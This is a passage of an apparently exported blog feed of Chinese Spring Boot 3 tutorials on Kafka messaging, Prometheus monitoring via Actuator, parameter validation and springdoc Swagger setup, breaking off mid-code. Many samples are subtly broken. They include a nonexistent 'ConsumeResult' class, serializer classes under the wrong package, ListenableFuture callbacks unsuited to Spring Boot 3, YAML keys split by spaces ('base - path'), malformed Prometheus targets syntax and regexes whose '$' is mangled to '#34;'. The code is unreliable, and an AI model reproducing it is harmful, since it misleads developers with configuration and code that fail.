<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">bootstrap-servers:</span> <span class="string">kafka-cluster:9092</span> <span class="comment"># 建议使用Kafka集群地址</span></span><br><span class="line">    <span class="attr">consumer:</span></span><br><span class="line">      <span class="attr">group-id:</span> <span class="string">my-consumer-group</span></span><br><span class="line">      <span class="attr">key-deserializer:</span> <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line">      <span class="attr">value-deserializer:</span> <span class="string">org.apache.kafka.common.serialization.JsonDeserializer</span></span><br><span class="line">      <span class="attr">auto-offset-reset:</span> <span class="string">earliest</span> <span class="comment"># 消息偏移量重置策略</span></span><br><span class="line">      <span class="attr">max-poll-records:</span> <span class="number">500</span> <span class="comment"># 单次拉取最大消息数</span></span><br><span class="line">    <span class="attr">producer:</span></span><br><span class="line">      <span class="attr">key-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="attr">value-serializer:</span> <span class="string">org.apache.kafka.common.serialization.JsonSerializer</span></span><br><span class="line">      <span class="attr">acks:</span> <span class="string">all</span> <span class="comment"># 消息确认机制</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span> <span class="comment"># 发送失败重试次数</span></span><br></pre></td></tr></table></figure>
<p>在上述配置中，auto-offset-reset参数决定了消费者在找不到已提交的偏移量时的处理策略，acks参数则控制生产者发送消息的确认机制。此外，若涉及自定义对象的消息传递，需实现org.apache.kafka.common.serialization.Serializer和org.apache.kafka.common.serialization.Deserializer接口，并在配置文件中指定序列化类，以确保消息在网络传输过程中的高效性和完整性。</p>
<p><strong>生产者与消费者的代码实现优化</strong><br>生产者代码优化：在 Spring Boot3 项目中，Kafka 生产者的实现需充分利用 Spring 的依赖注入机制和 KafkaTemplate 的高级特性。示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.support.SendResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.concurrent.ListenableFuture;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.concurrent.ListenableFutureCallback;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KafkaProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TOPIC</span> <span class="operator">=</span> <span class="string">&quot;my-topic&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String, Object&gt; kafkaTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(Object message)</span> &#123;</span><br><span class="line">        ListenableFuture&lt;SendResult&lt;String, Object&gt;&gt; future = kafkaTemplate.send(TOPIC, message);</span><br><span class="line">        future.addCallback(<span class="keyword">new</span> <span class="title class_">ListenableFutureCallback</span>&lt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(SendResult&lt;String, Object&gt; result)</span> &#123;</span><br><span class="line">                <span class="comment">// 消息发送成功处理逻辑</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Throwable ex)</span> &#123;</span><br><span class="line">                <span class="comment">// 消息发送失败处理逻辑</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过ListenableFuture和ListenableFutureCallback接口，能够实现消息发送的异步监听，及时捕获消息发送过程中的异常，提升系统的稳定性和可维护性。<br>消费者代码优化：Kafka 消费者的实现需结合 Spring 的事件驱动编程模型和 Kafka 的消费组机制。示例代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.consumer.ConsumeResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KafkaConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@KafkaListener(topics = &quot;my-topic&quot;, groupId = &quot;my-consumer-group&quot;, containerFactory = &quot;kafkaListenerContainerFactory&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">consumeMessage</span><span class="params">(ConsumeResult&lt;String, Object&gt; result)</span> &#123;</span><br><span class="line">        <span class="comment">// 消息消费业务逻辑</span></span><br><span class="line">        <span class="comment">// 可通过result获取消息的元数据信息，如分区、偏移量等</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际应用中，建议通过@KafkaListener注解的containerFactory属性自定义消费者容器工厂，以实现消费者线程池的优化配置、消息反序列化策略的定制化等功能，从而满足复杂业务场景下的消息消费需求。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成三【Prometheus框架-实现高效监控】</title>
    <url>/cnblogs.github.io/p/d6f4.html</url>
    <content><![CDATA[<blockquote>
<p>项目依赖配置</p>
</blockquote>
<p>在 Spring Boot3 项目的构建过程中，需在pom.xml文件中引入必要的依赖项，以实现与 Prometheus 的集成功能。具体需添加spring-boot-starter-actuator和io.micrometer下的micrometer-registry-prometheus依赖。spring-boot-starter-actuator作为 Spring Boot 生态中的核心组件，提供了丰富的应用监控与管理端点，可实现包括健康检查、环境变量信息展示、线程池运行状态监控等在内的多项关键指标的暴露功能。而micrometer-registry-prometheus则承担着将 Micrometer 监控体系与 Prometheus 进行对接的重要职责，确保监控指标能够以 Prometheus 可识别的格式进行输出。在依赖版本选择方面，鉴于 Spring Boot3.x 版本的特性，需特别关注与micrometer-registry-prometheus的兼容性问题。例如，在 Spring Boot3.0.0 版本环境下，应选用与之适配的micrometer-registry-prometheus稳定版本，以规避因版本不兼容导致的类加载异常、监控指标无法正常暴露等技术问题。具体依赖添加代码如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-registry-prometheus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Actuator 端点配置</p>
</blockquote>
<p>完成依赖引入后，需在application.yml或application.properties配置文件中对 Actuator 进行相关配置，以实现 Prometheus 监控端点的正确暴露。以application.yml配置文件为例，具体配置内容如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">metrics:</span></span><br><span class="line">    <span class="attr">export:</span></span><br><span class="line">      <span class="attr">prometheus:</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">endpoints:</span></span><br><span class="line">      <span class="attr">web:</span></span><br><span class="line">        <span class="attr">base - path:</span> <span class="string">&quot;/status&quot;</span>  <span class="comment"># 将/actuator/xxx修改为/status/xxx，防止被猜到</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">request:</span></span><br><span class="line">    <span class="attr">metric - name:</span> <span class="string">&quot;application:request&quot;</span>  <span class="comment"># 自定义接口指标名</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">metric - name:</span> <span class="string">&quot;application:client_request&quot;</span>  <span class="comment"># 自定义http客户端指标名</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">10111</span>  <span class="comment"># 指定端口，默认跟server.port一样，可以防止被猜到</span></span><br></pre></td></tr></table></figure>
<p>其中，management.endpoints.web.exposure.include: ‘*’配置项用于开启所有 Actuator 端点的暴露，便于 Prometheus 进行指标采集。但在生产环境中，从安全防护角度考虑，建议根据实际需求按需暴露相关端点。management.metrics.export.prometheus.enabled: true配置用于激活 Prometheus 指标导出功能；management.endpoints.web.base - path: “&#x2F;status”配置项则用于修改 Actuator 端点的基础路径，通过路径变更可有效降低端点被恶意访问的风险；server.request.metric - name与server.client.request.metric - name配置项分别用于自定义接口请求指标名称与 HTTP 客户端请求指标名称，便于在 Prometheus 监控系统中进行精准的指标识别与查询分析。</p>
<blockquote>
<p>Prometheus Server 配置</p>
</blockquote>
<p>在完成 Spring Boot3 应用端的配置后，需对 Prometheus Server 进行相应配置，以实现对目标应用的监控接入。下载并启动 Prometheus Server 后，需对其核心配置文件prometheus.yml进行修改，将 Spring Boot3 应用纳入监控目标范围。具体配置示例如下：</p>
<pre><code class="yml">scrape_configs:
  - job_name:&#39;spring - boot - application&#39;
    metrics_path: &#39;/status/prometheus&#39;  # 或者 &#39;/actuator/prometheus&#39;，取决于您的配置
    scrape_interval: 15s  # Prometheus从应用中抓取指标的频率
    static_configs:
      - targets: (&#39;192.168.1.100:10111&#39;)  # Spring Boot应用所在服务器的IP地址和端口号
</code></pre>
<p>在上述配置中，scrape_interval参数用于设定 Prometheus 对目标应用进行指标抓取的时间间隔，15 秒的抓取频率在保障监控数据实时性的同时，可有效控制对应用系统的性能影响。metrics_path参数需与 Spring Boot3 应用中配置的 Actuator 监控指标暴露路径保持一致，以确保 Prometheus 能够正确获取监控数据。targets列表用于指定 Spring Boot3 应用所在服务器的 IP 地址与端口号，当存在多个应用实例时，可通过扩展targets列表的方式实现对多实例的统一监控。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成九【Validation参数校验框架】</title>
    <url>/cnblogs.github.io/p/a9b4.html</url>
    <content><![CDATA[<blockquote>
<p>开启参数校验的准备工作</p>
</blockquote>
<p>要在 Spring Boot3 项目中开启参数校验功能，首先需要在项目的pom.xml文件中引入spring-boot-starter-validation依赖。这个依赖基于强大的 Hibernate Validator 实现，就如同为我们开启了参数校验的大门，提供了全面且便捷的参数校验支持。在pom.xml文件中添加如下依赖代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>引入这个依赖后，Spring Boot3 就已经为我们搭建好了参数校验的基础环境，接下来我们就可以利用各种校验工具和注解来实现具体的校验逻辑了。</p>
<blockquote>
<p>Spring Boot3 的内置校验注解</p>
</blockquote>
<p>Spring Boot3 为我们提供了丰富多样的内置校验注解，这些注解是进行参数校验的得力工具，它们各自具备独特的功能，能够满足我们在不同场景下的校验需求。</p>
<p><strong>@NotBlank：</strong>用于验证字符串不能为空且不能仅由空白字符组成。例如，在用户注册场景中，用户名通常不允许为空且不能全是空格，我们可以在对应的实体类属性上添加这个注解。<br><strong>@NotEmpty：</strong>可用于验证字符串、集合、数组等不为空。比如在一个任务管理系统中，任务列表不能为空，就可以使用该注解进行校验。<br><strong>@NotNull：</strong>主要用于验证基本数据类型的包装类、对象等不为空。像在订单系统中，订单编号一般不能为空，就可以用它来校验。<br><strong>@Max和@Min：</strong>用于验证数值类型的参数是否在指定的最大值和最小值范围内。例如，商品的折扣力度可能需要限制在一定的数值区间内，这时就可以使用这两个注解。<br><strong>@Range：</strong>同样用于验证数值范围，与 @Max 和 @Min 不同的是，它可以同时指定最大值和最小值，使用起来更加简洁。<br><strong>@Email：</strong>专门用于验证邮箱格式的正确性。在用户注册时验证用户输入的邮箱地址是否合法，这个注解就派上用场了。<br><strong>@Pattern：</strong>可以通过正则表达式来验证字符串是否匹配指定的模式。比如校验手机号码格式等场景，就可以使用它来实现自定义的格式校验。</p>
<blockquote>
<p>定义需要校验的实体类</p>
</blockquote>
<p>当我们了解了这些内置校验注解后，就可以在实体类中使用它们来定义参数的校验规则。以一个用户注册的场景为例，假设我们有一个UserRegisterDTO实体类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRegisterDTO</span> &#123;</span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;用户名不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;密码不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="meta">@Email(message = &quot;邮箱格式不正确&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="meta">@Pattern(regexp = &quot;^1[3-9]\\d&#123;9&#125;#34;, message = &quot;手机号码格式不正确&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="comment">// 生成getter和setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个实体类中，我们在每个属性上添加了相应的校验注解，并通过message属性来指定校验失败时返回给前端的错误信息。这样，当用户通过 Post 请求提交注册信息时，Spring Boot3 就会根据这些注解来校验请求体中的数据是否合法。</p>
<blockquote>
<p>在 Controller 中编写校验逻辑</p>
</blockquote>
<p>在定义好需要校验的实体类后，接下来我们要在 Controller 层中编写校验逻辑。在 Controller 的接口方法中，通过@Valid或@Validated注解来触发参数校验。<br><strong>使用 @Valid 注解</strong><br>@Valid注解就像是一个启动器，当请求进入 Controller 层方法时，它会促使 Spring Boot3 开始对参数进行校验。以下是一个简单的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">registerUser</span><span class="params">(<span class="meta">@Valid</span> <span class="meta">@RequestBody</span> UserRegisterDTO userRegisterDTO)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里开始处理正常的业务逻辑，比如将用户信息保存到数据库</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(<span class="string">&quot;注册成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个例子中，我们在registerUser方法的参数userRegisterDTO前添加了@Valid注解，并且该参数使用@RequestBody注解来接收 Post 请求中的 JSON 格式数据。当请求到达这个方法时，Spring Boot3 会自动检查userRegisterDTO中的各个字段是否符合在实体类中定义的校验规则。如果校验通过，就会执行方法内的业务逻辑；如果校验失败，Spring Boot3 会抛出<br>MethodArgumentNotValidException异常。</p>
<blockquote>
<p>使用 @Validated 注解</p>
</blockquote>
<p>@Validated注解也是 Spring Boot3 中用于参数校验的重要注解，与@Valid相比，它具有一些独特的优势。@Validated不仅可以用在方法参数上进行校验，还支持分组校验功能，这使得它在处理复杂业务场景时更加灵活。例如，在一个用户信息管理系统中，用户信息的更新和创建可能需要不同的校验规则。我们可以定义不同的校验分组，然后在实体类和 Controller 方法中使用@Validated注解来指定不同的分组。以下是一个简单的示例：</p>
<p>首先定义校验分组接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreateGroup</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UpdateGroup</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>然后在实体类中根据不同的分组添加校验注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDTO</span> &#123;</span><br><span class="line">    <span class="meta">@NotNull(groups = UpdateGroup.class, message = &quot;用户ID在更新时不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="meta">@NotBlank(groups = &#123;CreateGroup.class, UpdateGroup.class&#125;, message = &quot;用户名不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="comment">// 其他属性及getter和setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 Controller 中使用@Validated注解并指定分组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/create&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">createUser</span><span class="params">(<span class="meta">@Validated(CreateGroup.class)</span> <span class="meta">@RequestBody</span> UserDTO userDTO)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建用户的业务逻辑</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(<span class="string">&quot;用户创建成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PutMapping(&quot;/update&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">updateUser</span><span class="params">(<span class="meta">@Validated(UpdateGroup.class)</span> <span class="meta">@RequestBody</span> UserDTO userDTO)</span> &#123;</span><br><span class="line">        <span class="comment">// 更新用户的业务逻辑</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(<span class="string">&quot;用户更新成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这种方式，我们可以根据不同的业务场景，灵活地应用不同的校验规则，提高了代码的可维护性和扩展性。</p>
<p>获取校验结果并进行错误处理,当参数校验失败时，Spring Boot3 会抛出MethodArgumentNotValidException异常。为了给前端返回友好的错误提示，我们需要对这个异常进行统一处理。在 Spring Boot3 中，我们可以通过创建一个全局异常处理类，并使用@ControllerAdvice注解来实现全局异常处理。以下是一个全局异常处理类的示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(MethodArgumentNotValidException.class)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">handleMethodArgumentNotValidException</span><span class="params">(MethodArgumentNotValidException e)</span> &#123;</span><br><span class="line">        List&lt;String&gt; errorMessages = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        e.getBindingResult().getAllErrors().forEach(error -&gt; &#123;</span><br><span class="line">            errorMessages.add(error.getDefaultMessage());</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> Result.error(<span class="string">&quot;参数校验失败&quot;</span>, errorMessages);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个全局异常处理类中，我们定义了一个handleMethodArgumentNotValidException方法，该方法使用@ExceptionHandler注解来捕获MethodArgumentNotValidException异常。在方法内部，我们从异常中获取所有的校验错误信息，并将这些信息封装成一个Result对象返回给前端。这样，前端就能够清晰地接收到参数校验失败的具体原因，方便进行错误提示和用户交互。</p>
<p><strong>自定义校验注解</strong><br>在一些复杂的业务场景中，Spring Boot3 提供的内置校验注解可能无法满足我们的全部需求。这时，我们可以自定义校验注解来实现更灵活、更个性化的参数校验。自定义校验注解通常需要以下几个步骤：</p>
<blockquote>
<p>定义注解</p>
</blockquote>
<p>首先创建一个新的注解类，在注解类上使用@Constraint注解来指定该注解的校验器，同时可以添加一些属性来定制校验规则和错误提示信息。以下是一个自定义手机号码校验注解的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.FIELD, ElementType.PARAMETER&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Constraint(validatedBy = PhoneNumberValidator.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> PhoneNumber &#123;</span><br><span class="line">    String <span class="title function_">message</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;手机号码格式不正确&quot;</span>;</span><br><span class="line">    Class&lt;?&gt;[] groups() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Payload</span>&gt;[] payload() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个注解定义中，@Target注解指定了该注解可以应用在字段和方法参数上，@Retention注解指定了注解在运行时保留，@Constraint注解指定了该注解的校验器为PhoneNumberValidator.class。</p>
<blockquote>
<p>实现校验器</p>
</blockquote>
<p>创建一个实现了ConstraintValidator接口的校验器类，在这个类中实现具体的校验逻辑。以下是PhoneNumberValidator校验器的实现代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PhoneNumberValidator</span> <span class="keyword">implements</span> <span class="title class_">ConstraintValidator</span>&lt;PhoneNumber, String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(PhoneNumber constraintAnnotation)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化方法，可以在这里获取注解的属性值等信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String value, ConstraintValidatorContext context)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value.matches(<span class="string">&quot;^1[3-9]\\d&#123;9&#125;#34;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>在isValid方法中，我们实现了具体的手机号码格式校验逻辑，只有当输入的字符串符合手机号码的正则表达式格式时，才返回true，表示校验通过。</p>
<blockquote>
<p>在实体类中使用自定义注解</p>
</blockquote>
<p>定义好注解和校验器后，就可以在实体类中使用自定义注解了。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDTO</span> &#123;</span><br><span class="line">    <span class="meta">@PhoneNumber</span></span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line">    <span class="comment">// 其他属性及getter和setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这种方式，我们就实现了自定义的参数校验注解，能够在实际开发中满足各种复杂的业务校验需求。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成二【Swagger3框架】</title>
    <url>/cnblogs.github.io/p/114a.html</url>
    <content><![CDATA[<blockquote>
<p>添加依赖</p>
</blockquote>
<p>在 Spring Boot3 项目的 pom.xml 文件中，你需要添加springdoc-openapi-starter-webmvc-ui 依赖。具体配置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springdoc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springdoc-openapi-starter-webmvc-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<blockquote>
<p>配置 Swagger3</p>
</blockquote>
<p>在 Spring Boot 应用中，创建一个配置类，例如 OpenApiConfig.java 。在该类中，你可以定义 OpenAPI 相关的配置信息，包括基础 URL、标题、版本、作者联系信息、描述、许可证等。示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.models.OpenAPI;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.models.info.Contact;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.models.info.Info;</span><br><span class="line"><span class="keyword">import</span> io.swagger.v3.oas.models.info.License;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OpenApiConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.version&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String apiVersion;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.title&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String apiTitle;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.description&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String apiDescription;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.termsOfServiceUrl&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String termsOfServiceUrl;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.contact.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String contactName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.contact.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String contactUrl;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.contact.email&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String contactEmail;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.license.name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String licenseName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;springdoc.license.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String licenseUrl;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> OpenAPI <span class="title function_">customOpenAPI</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OpenAPI</span>()</span><br><span class="line">              .info(<span class="keyword">new</span> <span class="title class_">Info</span>()</span><br><span class="line">                  .title(apiTitle)</span><br><span class="line">                  .version(apiVersion)</span><br><span class="line">                  .description(apiDescription)</span><br><span class="line">                  .termsOfService(termsOfServiceUrl)</span><br><span class="line">                 